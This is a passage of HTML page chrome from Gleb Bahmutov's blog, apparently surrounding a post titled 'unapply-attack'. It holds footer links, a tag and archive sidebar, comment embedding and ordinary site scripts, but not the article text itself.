      <footer class="article-footer personal-links">
  <p>
    Follow Gleb Bahmutov <a target="_blank" rel="noopener" href="https://twitter.com/bahmutov">@bahmutov</a>,
    see his projects at <a href="https://glebbahmutov.com">glebbahmutov.com</a>,
    watch his Cypress <a target="_blank" rel="noopener" href="https://www.youtube.com/c/glebbahmutov/videos">videos</a>,
    browse his <a target="_blank" rel="noopener" href="https://slides.com/bahmutov">presentations</a>
  </p>
  <p>
    Want to know more about Cypress? Check out <a href="https://cypress.tips" target="_blank">cypress.tips</a>
  </p>
</footer>
<script src="https://rawgit.com/toddmotto/linkjuice/702066a37124081e7ad1a972844a9a91115be05a/dist/linkjuice.js"></script>
<script>
function contentFn (node, icon) {
  const s = '<a href="#' + node.id + '" class="linkjuice">' +
    node.innerHTML + ' ' + icon + '</a>\n'
  return s
}
linkjuice.init('.article-entry', {
  selectors: ['h2 span'],
  icon: '<span class="link-symbol">#</span>',
  contentFn: contentFn
});
</script>

    

    <footer class="article-footer">
      <a data-url="https://glebbahmutov.com/blog/unapply-attack/" data-id="ckz61kr8g01f2kivgcdt63qog" class="article-share-link">Share</a>
      
        <a href="https://glebbahmutov.com/blog/unapply-attack/#disqus_thread" class="article-comment-link">Comments</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="../tags/javascript/" rel="tag">javascript</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="../tags/security/" rel="tag">security</a></li></ul>

    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="../treasure-your-product-managers/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          Treasure your product managers
        
      </div>
    </a>
  
  
    <a href="../partial-application-for-options-object/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">Partial application for options object</div>
    </a>
  
</nav>

  
</article>


<section id="comments">
  <div id="disqus_thread">
    <noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
  </div>
</section>

</section>
        
          <aside id="sidebar">
  
    <style>
#carbonads {
  display: block;
  overflow: hidden;
  font-size: 11px;
  font-family: Verdana, "Helvetica Neue", Helvetica, sans-serif;
  line-height: 1.5;
}

#carbonads a {
  color: #258fb8;
  text-decoration: none;
}

#carbonads a:hover {
  text-decoration: underline;
}

#carbonads span {
  position: relative;
  display: block;
  overflow: hidden;
}

.carbon-img {
  float: left;
  margin-right: 1em;
}

.carbon-img img { display: block; }

.carbon-text {
  display: block;
  float: left;
  text-align: left;
  margin-top: 0.5em;
}
@media screen and (min-width: 1024px) {
  .carbon-text {
    max-width: calc(100% - 130px - 1em);
  }
}

.carbon-poweredby {
  /*position: absolute;
  right: 0;
  bottom: 0;*/
  float: right;
  display: block;
  font-size: 11px;
}
</style>
<div class="widget-wrap">
  <div class="widget-title">&nbsp;</div>
  <div class="widget">
    <!-- Carbon Ads -->
    <script async type="text/javascript"
      src="//cdn.carbonads.com/carbon.js?zoneid=1673&serve=C6AILKT&placement=glebbahmutovcom"
      id="_carbonads_js"></script>
  </div>
</div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Categories</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="../categories/book-review/">book review</a><span class="category-list-count">15</span></li><li class="category-list-item"><a class="category-list-link" href="../categories/climate/">climate</a><span class="category-list-count">9</span></li><li class="category-list-item"><a class="category-list-link" href="../categories/people/">people</a><span class="category-list-count">22</span></li><li class="category-list-item"><a class="category-list-link" href="../categories/process/">process</a><span class="category-list-count">142</span></li><li class="category-list-item"><a class="category-list-link" href="../categories/products/">products</a><span class="category-list-count">451</span></li></ul>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="../tags/11ty/" rel="tag">11ty</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="../tags/QUnit/" rel="tag">QUnit</a><span class="tag-list-count">5</span></li><li class="tag-list-item"><a class="tag-list-link" href="../tags/a11y/" rel="tag">a11y</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="../tags/advice/" rel="tag">advice</a><span class="tag-list-count">112</span></li><li class="tag-list-item"><a class="tag-list-link" href="../tags/algolia/" rel="tag">algolia</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="../tags/angularjs/" rel="tag">angularjs</a><span class="tag-list-count">58</span></li><li class="tag-list-item"><a class="tag-list-link" href="../tags/angularjs2/" rel="tag">angularjs2</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="../tags/assertions/" rel="tag">assertions</a><span class="tag-list-count">9</span></li><li class="tag-list-item"><a class="tag-list-link" href="../tags/ast/" rel="tag">ast</a><span class="tag-list-count">8</span></li><li class="tag-list-item"><a class="tag-list-link" href="../tags/boilerplate/" rel="tag">boilerplate</a><span class="tag-list-count">14</span></li><li class="tag-list-item"><a class="tag-list-link" href="../tags/browser/" rel="tag">browser</a><span class="tag-list-count">19</span></li><li class="tag-list-item"><a class="tag-list-link" href="../tags/ci/" rel="tag">ci</a><span class="tag-list-count">27</span></li><li class="tag-list-item"><a class="tag-list-link" href="../tags/circle/" rel="tag">circle</a><span class="tag-list-count">11</span></li><li class="tag-list-item"><a class="tag-list-link" href="../tags/climate/" rel="tag">climate</a><span class="tag-list-count">13</span></li><li class="tag-list-item"><a class="tag-list-link" href="../tags/code-coverage/" rel="tag">code coverage</a><span class="tag-list-count">13</span></li><li class="tag-list-item"><a class="tag-list-link" href="../tags/concurrency/" rel="tag">concurrency</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="../tags/cyclejs/" rel="tag">cyclejs</a><span class="tag-list-count">7</span></li><li class="tag-list-item"><a class="tag-list-link" href="../tags/cypress/" rel="tag">cypress</a><span class="tag-list-count">180</span></li><li class="tag-list-item"><a class="tag-list-link" href="../tags/cypress-dashboard/" rel="tag">cypress dashboard</a><span class="tag-list-count">11</span></li><li class="tag-list-item"><a class="tag-list-link" href="../tags/d3/" rel="tag">d3</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="../tags/db/" rel="tag">db</a><span class="tag-list-count">13</span></li><li class="tag-list-item"><a class="tag-list-link" href="../tags/docker/" rel="tag">docker</a><span class="tag-list-count">12</span></li><li class="tag-list-item"><a class="tag-list-link" href="../tags/documentation/" rel="tag">documentation</a><span class="tag-list-count">6</span></li><li class="tag-list-item"><a class="tag-list-link" href="../tags/es6/" rel="tag">es6</a><span class="tag-list-count">13</span></li><li class="tag-list-item"><a class="tag-list-link" href="../tags/es7/" rel="tag">es7</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="../tags/functional/" rel="tag">functional</a><span class="tag-list-count">70</span></li><li class="tag-list-item"><a class="tag-list-link" href="../tags/generators/" rel="tag">generators</a><span class="tag-list-count">5</span></li><li class="tag-list-item"><a class="tag-list-link" href="../tags/git/" rel="tag">git</a><span class="tag-list-count">14</span></li><li class="tag-list-item"><a class="tag-list-link" href="../tags/github/" rel="tag">github</a><span class="tag-list-count">19</span></li><li class="tag-list-item"><a class="tag-list-link" href="../tags/graphql/" rel="tag">graphql</a><span class="tag-list-count">5</span></li><li class="tag-list-item"><a class="tag-list-link" href="../tags/grunt/" rel="tag">grunt</a><span class="tag-list-count">7</span></li><li class="tag-list-item"><a class="tag-list-link" href="../tags/gulp/" rel="tag">gulp</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="../tags/hiring/" rel="tag">hiring</a><span class="tag-list-count">4</span></li><li class="tag-list-item"><a class="tag-list-link" href="../tags/hyperapp/" rel="tag">hyperapp</a><span class="tag-list-count">7</span></li><li class="tag-list-item"><a class="tag-list-link" href="../tags/immutable/" rel="tag">immutable</a><span class="tag-list-count">5</span></li><li class="tag-list-item"><a class="tag-list-link" href="../tags/interview/" rel="tag">interview</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="../tags/jade/" rel="tag">jade</a><span class="tag-list-count">4</span></li><li class="tag-list-item"><a class="tag-list-link" href="../tags/javascript/" rel="tag">javascript</a><span class="tag-list-count">166</span></li><li class="tag-list-item"><a class="tag-list-link" href="../tags/jshint/" rel="tag">jshint</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="../tags/markdown/" rel="tag">markdown</a><span class="tag-list-count">11</span></li><li class="tag-list-item"><a class="tag-list-link" href="../tags/model-based-testing/" rel="tag">model-based testing</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="../tags/modular-development/" rel="tag">modular development</a><span class="tag-list-count">28</span></li><li class="tag-list-item"><a class="tag-list-link" href="../tags/netlify/" rel="tag">netlify</a><span class="tag-list-count">4</span></li><li class="tag-list-item"><a class="tag-list-link" href="../tags/nodejs/" rel="tag">nodejs</a><span class="tag-list-count">84</span></li><li class="tag-list-item"><a class="tag-list-link" href="../tags/performance/" rel="tag">performance</a><span class="tag-list-count">22</span></li><li class="tag-list-item"><a class="tag-list-link" href="../tags/presentation/" rel="tag">presentation</a><span class="tag-list-count">7</span></li><li class="tag-list-item"><a class="tag-list-link" href="../tags/promises/" rel="tag">promises</a><span class="tag-list-count">31</span></li><li class="tag-list-item"><a class="tag-list-link" href="../tags/proposal/" rel="tag">proposal</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="../tags/ramda/" rel="tag">ramda</a><span class="tag-list-count">28</span></li><li class="tag-list-item"><a class="tag-list-link" href="../tags/react/" rel="tag">react</a><span class="tag-list-count">6</span></li><li class="tag-list-item"><a class="tag-list-link" href="../tags/react-native/" rel="tag">react native</a><span class="tag-list-count">4</span></li><li class="tag-list-item"><a class="tag-list-link" href="../tags/reactive/" rel="tag">reactive</a><span class="tag-list-count">12</span></li><li class="tag-list-item"><a class="tag-list-link" href="../tags/reactjs/" rel="tag">reactjs</a><span class="tag-list-count">4</span></li><li class="tag-list-item"><a class="tag-list-link" href="../tags/renovate/" rel="tag">renovate</a><span class="tag-list-count">5</span></li><li class="tag-list-item"><a class="tag-list-link" href="../tags/screencast/" rel="tag">screencast</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="../tags/security/" rel="tag">security</a><span class="tag-list-count">9</span></li><li class="tag-list-item"><a class="tag-list-link" href="../tags/sentry/" rel="tag">sentry</a><span class="tag-list-count">11</span></li><li class="tag-list-item"><a class="tag-list-link" href="../tags/service-workers/" rel="tag">service workers</a><span class="tag-list-count">6</span></li><li class="tag-list-item"><a class="tag-list-link" href="../tags/state-machine/" rel="tag">state machine</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="../tags/testing/" rel="tag">testing</a><span class="tag-list-count">135</span></li><li class="tag-list-item"><a class="tag-list-link" href="../tags/tutorial/" rel="tag">tutorial</a><span class="tag-list-count">19</span></li><li class="tag-list-item"><a class="tag-list-link" href="../tags/typescript/" rel="tag">typescript</a><span class="tag-list-count">7</span></li><li class="tag-list-item"><a class="tag-list-link" href="../tags/ui/" rel="tag">ui</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="../tags/vercel/" rel="tag">vercel</a><span class="tag-list-count">9</span></li><li class="tag-list-item"><a class="tag-list-link" href="../tags/visual-testing/" rel="tag">visual testing</a><span class="tag-list-count">4</span></li><li class="tag-list-item"><a class="tag-list-link" href="../tags/vuejs/" rel="tag">vuejs</a><span class="tag-list-count">5</span></li><li class="tag-list-item"><a class="tag-list-link" href="../tags/web-workers/" rel="tag">web workers</a><span class="tag-list-count">6</span></li><li class="tag-list-item"><a class="tag-list-link" href="../tags/webpack/" rel="tag">webpack</a><span class="tag-list-count">3</span></li></ul>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="../tags/11ty/" style="font-size: 10.42px;">11ty</a> <a href="../tags/QUnit/" style="font-size: 11.67px;">QUnit</a> <a href="../tags/a11y/" style="font-size: 10.83px;">a11y</a> <a href="../tags/advice/" style="font-size: 18.75px;">advice</a> <a href="../tags/algolia/" style="font-size: 10.42px;">algolia</a> <a href="../tags/angularjs/" style="font-size: 17.5px;">angularjs</a> <a href="../tags/angularjs2/" style="font-size: 10px;">angularjs2</a> <a href="../tags/assertions/" style="font-size: 13.33px;">assertions</a> <a href="../tags/ast/" style="font-size: 12.92px;">ast</a> <a href="../tags/boilerplate/" style="font-size: 15px;">boilerplate</a> <a href="../tags/browser/" style="font-size: 15.42px;">browser</a> <a href="../tags/ci/" style="font-size: 16.25px;">ci</a> <a href="../tags/circle/" style="font-size: 13.75px;">circle</a> <a href="../tags/climate/" style="font-size: 14.58px;">climate</a> <a href="../tags/code-coverage/" style="font-size: 14.58px;">code coverage</a> <a href="../tags/concurrency/" style="font-size: 10px;">concurrency</a> <a href="../tags/cyclejs/" style="font-size: 12.5px;">cyclejs</a> <a href="../tags/cypress/" style="font-size: 20px;">cypress</a> <a href="../tags/cypress-dashboard/" style="font-size: 13.75px;">cypress dashboard</a> <a href="../tags/d3/" style="font-size: 10.83px;">d3</a> <a href="../tags/db/" style="font-size: 14.58px;">db</a> <a href="../tags/docker/" style="font-size: 14.17px;">docker</a> <a href="../tags/documentation/" style="font-size: 12.08px;">documentation</a> <a href="../tags/es6/" style="font-size: 14.58px;">es6</a> <a href="../tags/es7/" style="font-size: 10px;">es7</a> <a href="../tags/functional/" style="font-size: 17.92px;">functional</a> <a href="../tags/generators/" style="font-size: 11.67px;">generators</a> <a href="../tags/git/" style="font-size: 15px;">git</a> <a href="../tags/github/" style="font-size: 15.42px;">github</a> <a href="../tags/graphql/" style="font-size: 11.67px;">graphql</a> <a href="../tags/grunt/" style="font-size: 12.5px;">grunt</a> <a href="../tags/gulp/" style="font-size: 10.83px;">gulp</a> <a href="../tags/hiring/" style="font-size: 11.25px;">hiring</a> <a href="../tags/hyperapp/" style="font-size: 12.5px;">hyperapp</a> <a href="../tags/immutable/" style="font-size: 11.67px;">immutable</a> <a href="../tags/interview/" style="font-size: 10.83px;">interview</a> <a href="../tags/jade/" style="font-size: 11.25px;">jade</a> <a href="../tags/javascript/" style="font-size: 19.58px;">javascript</a> <a href="../tags/jshint/" style="font-size: 10.83px;">jshint</a> <a href="../tags/markdown/" style="font-size: 13.75px;">markdown</a> <a href="../tags/model-based-testing/" style="font-size: 10px;">model-based testing</a> <a href="../tags/modular-development/" style="font-size: 16.67px;">modular development</a> <a href="../tags/netlify/" style="font-size: 11.25px;">netlify</a> <a href="../tags/nodejs/" style="font-size: 18.33px;">nodejs</a> <a href="../tags/performance/" style="font-size: 15.83px;">performance</a> <a href="../tags/presentation/" style="font-size: 12.5px;">presentation</a> <a href="../tags/promises/" style="font-size: 17.08px;">promises</a> <a href="../tags/proposal/" style="font-size: 10.42px;">proposal</a> <a href="../tags/ramda/" style="font-size: 16.67px;">ramda</a> <a href="../tags/react/" style="font-size: 12.08px;">react</a> <a href="../tags/react-native/" style="font-size: 11.25px;">react native</a> <a href="../tags/reactive/" style="font-size: 14.17px;">reactive</a> <a href="../tags/reactjs/" style="font-size: 11.25px;">reactjs</a> <a href="../tags/renovate/" style="font-size: 11.67px;">renovate</a> <a href="../tags/screencast/" style="font-size: 10px;">screencast</a> <a href="../tags/security/" style="font-size: 13.33px;">security</a> <a href="../tags/sentry/" style="font-size: 13.75px;">sentry</a> <a href="../tags/service-workers/" style="font-size: 12.08px;">service workers</a> <a href="../tags/state-machine/" style="font-size: 10px;">state machine</a> <a href="../tags/testing/" style="font-size: 19.17px;">testing</a> <a href="../tags/tutorial/" style="font-size: 15.42px;">tutorial</a> <a href="../tags/typescript/" style="font-size: 12.5px;">typescript</a> <a href="../tags/ui/" style="font-size: 10.42px;">ui</a> <a href="../tags/vercel/" style="font-size: 13.33px;">vercel</a> <a href="../tags/visual-testing/" style="font-size: 11.25px;">visual testing</a> <a href="../tags/vuejs/" style="font-size: 11.67px;">vuejs</a> <a href="../tags/web-workers/" style="font-size: 12.08px;">web workers</a> <a href="../tags/webpack/" style="font-size: 10.83px;">webpack</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="../archives/2022/02/">February 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="../archives/2022/01/">January 2022</a><span class="archive-list-count">11</span></li><li class="archive-list-item"><a class="archive-list-link" href="../archives/2021/12/">December 2021</a><span class="archive-list-count">11</span></li><li class="archive-list-item"><a class="archive-list-link" href="../archives/2021/11/">November 2021</a><span class="archive-list-count">7</span></li><li class="archive-list-item"><a class="archive-list-link" href="../archives/2021/10/">October 2021</a><span class="archive-list-count">8</span></li><li class="archive-list-item"><a class="archive-list-link" href="../archives/2021/09/">September 2021</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="../archives/2021/08/">August 2021</a><span class="archive-list-count">9</span></li><li class="archive-list-item"><a class="archive-list-link" href="../archives/2021/07/">July 2021</a><span class="archive-list-count">10</span></li><li class="archive-list-item"><a class="archive-list-link" href="../archives/2021/06/">June 2021</a><span class="archive-list-count">11</span></li><li class="archive-list-item"><a class="archive-list-link" href="../archives/2021/05/">May 2021</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="../archives/2021/04/">April 2021</a><span class="archive-list-count">9</span></li><li class="archive-list-item"><a class="archive-list-link" href="../archives/2021/03/">March 2021</a><span class="archive-list-count">9</span></li><li class="archive-list-item"><a class="archive-list-link" href="../archives/2021/02/">February 2021</a><span class="archive-list-count">9</span></li><li class="archive-list-item"><a class="archive-list-link" href="../archives/2021/01/">January 2021</a><span class="archive-list-count">7</span></li><li class="archive-list-item"><a class="archive-list-link" href="../archives/2020/12/">December 2020</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="../archives/2020/11/">November 2020</a><span class="archive-list-count">8</span></li><li class="archive-list-item"><a class="archive-list-link" href="../archives/2020/10/">October 2020</a><span class="archive-list-count">10</span></li><li class="archive-list-item"><a class="archive-list-link" href="../archives/2020/09/">September 2020</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="../archives/2020/08/">August 2020</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="../archives/2020/07/">July 2020</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="../archives/2020/06/">June 2020</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="../archives/2020/05/">May 2020</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="../archives/2020/04/">April 2020</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="../archives/2020/03/">March 2020</a><span class="archive-list-count">7</span></li><li class="archive-list-item"><a class="archive-list-link" href="../archives/2020/02/">February 2020</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="../archives/2020/01/">January 2020</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="../archives/2019/12/">December 2019</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="../archives/2019/11/">November 2019</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="../archives/2019/10/">October 2019</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="../archives/2019/09/">September 2019</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="../archives/2019/08/">August 2019</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="../archives/2019/07/">July 2019</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="../archives/2019/06/">June 2019</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="../archives/2019/05/">May 2019</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="../archives/2019/04/">April 2019</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="../archives/2019/03/">March 2019</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="../archives/2019/02/">February 2019</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="../archives/2019/01/">January 2019</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="../archives/2018/12/">December 2018</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="../archives/2018/11/">November 2018</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="../archives/2018/10/">October 2018</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="../archives/2018/09/">September 2018</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="../archives/2018/08/">August 2018</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="../archives/2018/06/">June 2018</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="../archives/2018/04/">April 2018</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="../archives/2018/03/">March 2018</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="../archives/2018/02/">February 2018</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="../archives/2018/01/">January 2018</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="../archives/2017/12/">December 2017</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="../archives/2017/11/">November 2017</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="../archives/2017/09/">September 2017</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="../archives/2017/08/">August 2017</a><span class="archive-list-count">9</span></li><li class="archive-list-item"><a class="archive-list-link" href="../archives/2017/07/">July 2017</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="../archives/2017/06/">June 2017</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="../archives/2017/05/">May 2017</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="../archives/2017/04/">April 2017</a><span class="archive-list-count">9</span></li><li class="archive-list-item"><a class="archive-list-link" href="../archives/2017/03/">March 2017</a><span class="archive-list-count">10</span></li><li class="archive-list-item"><a class="archive-list-link" href="../archives/2017/02/">February 2017</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="../archives/2017/01/">January 2017</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="../archives/2016/12/">December 2016</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="../archives/2016/11/">November 2016</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="../archives/2016/10/">October 2016</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="../archives/2016/09/">September 2016</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="../archives/2016/08/">August 2016</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="../archives/2016/07/">July 2016</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="../archives/2016/06/">June 2016</a><span class="archive-list-count">7</span></li><li class="archive-list-item"><a class="archive-list-link" href="../archives/2016/05/">May 2016</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="../archives/2016/04/">April 2016</a><span class="archive-list-count">8</span></li><li class="archive-list-item"><a class="archive-list-link" href="../archives/2016/03/">March 2016</a><span class="archive-list-count">10</span></li><li class="archive-list-item"><a class="archive-list-link" href="../archives/2016/02/">February 2016</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="../archives/2016/01/">January 2016</a><span class="archive-list-count">8</span></li><li class="archive-list-item"><a class="archive-list-link" href="../archives/2015/12/">December 2015</a><span class="archive-list-count">9</span></li><li class="archive-list-item"><a class="archive-list-link" href="../archives/2015/11/">November 2015</a><span class="archive-list-count">8</span></li><li class="archive-list-item"><a class="archive-list-link" href="../archives/2015/10/">October 2015</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="../archives/2015/09/">September 2015</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="../archives/2015/08/">August 2015</a><span class="archive-list-count">11</span></li><li class="archive-list-item"><a class="archive-list-link" href="../archives/2015/07/">July 2015</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="../archives/2015/06/">June 2015</a><span class="archive-list-count">9</span></li><li class="archive-list-item"><a class="archive-list-link" href="../archives/2015/05/">May 2015</a><span class="archive-list-count">8</span></li><li class="archive-list-item"><a class="archive-list-link" href="../archives/2015/04/">April 2015</a><span class="archive-list-count">10</span></li><li class="archive-list-item"><a class="archive-list-link" href="../archives/2015/03/">March 2015</a><span class="archive-list-count">15</span></li><li class="archive-list-item"><a class="archive-list-link" href="../archives/2015/02/">February 2015</a><span class="archive-list-count">13</span></li><li class="archive-list-item"><a class="archive-list-link" href="../archives/2015/01/">January 2015</a><span class="archive-list-count">10</span></li><li class="archive-list-item"><a class="archive-list-link" href="../archives/2014/12/">December 2014</a><span class="archive-list-count">8</span></li><li class="archive-list-item"><a class="archive-list-link" href="../archives/2014/11/">November 2014</a><span class="archive-list-count">19</span></li><li class="archive-list-item"><a class="archive-list-link" href="../archives/2014/10/">October 2014</a><span class="archive-list-count">8</span></li><li class="archive-list-item"><a class="archive-list-link" href="../archives/2014/09/">September 2014</a><span class="archive-list-count">13</span></li><li class="archive-list-item"><a class="archive-list-link" href="../archives/2014/08/">August 2014</a><span class="archive-list-count">12</span></li><li class="archive-list-item"><a class="archive-list-link" href="../archives/2014/07/">July 2014</a><span class="archive-list-count">13</span></li><li class="archive-list-item"><a class="archive-list-link" href="../archives/2014/06/">June 2014</a><span class="archive-list-count">9</span></li><li class="archive-list-item"><a class="archive-list-link" href="../archives/2014/05/">May 2014</a><span class="archive-list-count">11</span></li><li class="archive-list-item"><a class="archive-list-link" href="../archives/2014/04/">April 2014</a><span class="archive-list-count">13</span></li><li class="archive-list-item"><a class="archive-list-link" href="../archives/2014/03/">March 2014</a><span class="archive-list-count">11</span></li><li class="archive-list-item"><a class="archive-list-link" href="../archives/2014/02/">February 2014</a><span class="archive-list-count">12</span></li><li class="archive-list-item"><a class="archive-list-link" href="../archives/2014/01/">January 2014</a><span class="archive-list-count">11</span></li><li class="archive-list-item"><a class="archive-list-link" href="../archives/2013/12/">December 2013</a><span class="archive-list-count">11</span></li><li class="archive-list-item"><a class="archive-list-link" href="../archives/2013/11/">November 2013</a><span class="archive-list-count">14</span></li><li class="archive-list-item"><a class="archive-list-link" href="../archives/2013/10/">October 2013</a><span class="archive-list-count">11</span></li><li class="archive-list-item"><a class="archive-list-link" href="../archives/2013/09/">September 2013</a><span class="archive-list-count">10</span></li></ul>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recents</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="../react-state-from-e2e-tests/">Access React Components From Cypress E2E Tests</a>
          </li>
        
          <li>
            <a href="../repeat-tests/">Repeating Tests</a>
          </li>
        
          <li>
            <a href="../cypress-history-api-example/">Cypress History API Example</a>
          </li>
        
          <li>
            <a href="../wordle-page-objects/">Wordle Page Objects</a>
          </li>
        
          <li>
            <a href="../network-requests-with-cypress/">How To Check Network Requests Using Cypress</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2022 Gleb Bahmutov<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
</nav>
    
<script>
  var disqus_shortname = 'betterworldbybettersoftware';
  
  var disqus_url = 'https://glebbahmutov.com/blog/unapply-attack/';
  
  (function(){
    var dsq = document.createElement('script');
    dsq.type = 'text/javascript';
    dsq.async = true;
    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
  })();
</script>


<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  
<link rel="stylesheet" href="../fancybox/jquery.fancybox.css">

  
<script src="../fancybox/jquery.fancybox.pack.js"></script>




<script src="../js/script.js"></script>


  </div>
  <script src="https://cdn.jsdelivr.net/lodash/4.17.4/lodash.min.js"></script>
<script>
(function centerMainOnAsideScroll () {
  // when aside side bar scrolls outside the view
  // it centers the main content.
  const main = document.querySelector('#main')
  const aside = document.querySelector('aside#sidebar')
  console.assert(main, 'could not get #main')
  console.assert(aside, 'could not get aside')
  // initially the aside sidebar is visible
  let asideVisible = true

  function centerMain () {
    console.log('adding class center-main')
    main.classList.add('center-main')
  }
  function leftMain () {
    main.classList.remove('center-main')
  }

  function callWhenAsideScrollsUp (becameInvisible, becameVisible) {
    return function () {
      const border = 50
